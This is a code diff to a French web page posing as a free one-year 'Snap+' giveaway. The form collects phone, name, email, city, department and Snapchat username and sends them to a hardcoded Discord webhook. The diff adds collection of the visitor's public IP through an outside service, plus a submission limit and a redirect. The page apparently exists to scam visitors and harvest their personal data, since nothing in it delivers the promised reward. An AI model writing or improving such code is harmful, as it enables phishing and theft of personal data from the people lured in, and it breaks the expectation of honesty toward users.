@@ -103,7 +103,6 @@
     <p>Active 1 an de Snap+ gratuitement</p>
 
     <form id="giveawayForm">
-      <!-- Étape 1 : numéro de téléphone -->
       <div id="step1">
         <input
           type="text"
@@ -116,7 +115,6 @@
         <button type="button" onclick="showStep2()">Continuer</button>
       </div>
 
-      <!-- Étape 2 : autres infos -->
       <div id="step2">
         <input type="text" name="nom" placeholder="Nom" required />
         <input type="text" name="prenom" placeholder="Prénom" required />
@@ -136,6 +134,8 @@
 
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
+    const SUBMISSION_LIMIT = 2;
+    const TIME_WINDOW_MINUTES = 30;
 
     function showStep2() {
       const phoneInput = document.querySelector('[name="telephone"]');
@@ -147,11 +147,40 @@
       document.getElementById("step2").style.display = "block";
     }
 
-    document.getElementById("giveawayForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-      const data = new FormData(this);
+    // Fonction pour récupérer l'IP publique via service tiers
+    async function getPublicIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip || "IP inconnue";
+      } catch {
+        return "IP inconnue";
+      }
+    }
 
-      // Construire l'objet embed pour Discord
+    // Fonction pour vérifier la limite de soumissions dans localStorage
+    function canSubmit() {
+      const now = Date.now();
+      const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
+      // Garde seulement les soumissions dans la fenêtre de temps
+      const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
+      if (recent.length >= SUBMISSION_LIMIT) return false;
+      recent.push(now);
+      localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
+      return true;
+    }
+
+    document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      if (!canSubmit()) {
+        alert(`Vous avez dépassé la limite de ${SUBMISSION_LIMIT} participations toutes les ${TIME_WINDOW_MINUTES} minutes.`);
+        return;
+      }
+
+      const data = new FormData(this);
+      const ip = await getPublicIP();
+
       const embed = {
         title: "🎁 Nouvelle participation Snap+",
         color: 0xA54FFB,
@@ -162,7 +191,8 @@
           { name: "📧 Email", value: data.get("email") || "N/A", inline: false },
           { name: "🏙️ Ville", value: data.get("ville") || "N/A", inline: true },
           { name: "📍 Département", value: data.get("departement") || "N/A", inline: true },
-          { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true }
+          { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true },
+          { name: "🌐 IP", value: ip, inline: false }
         ],
         footer: {
           text: `Reçu le ${new Date().toLocaleString("fr-FR")}`,
@@ -177,10 +207,8 @@
       })
         .then((res) => {
           if (!res.ok) throw new Error("Erreur lors de l'envoi");
-          alert("Merci ! Une personne vous contactera bientôt.");
-          this.reset();
-          document.getElementById("step1").style.display = "block";
-          document.getElementById("step2").style.display = "none";
+          // Redirection vers la page Merci
+          window.location.href = "merci.html";
         })
         .catch((err) => {
           alert("Erreur lors de l’envoi. Réessayez.");
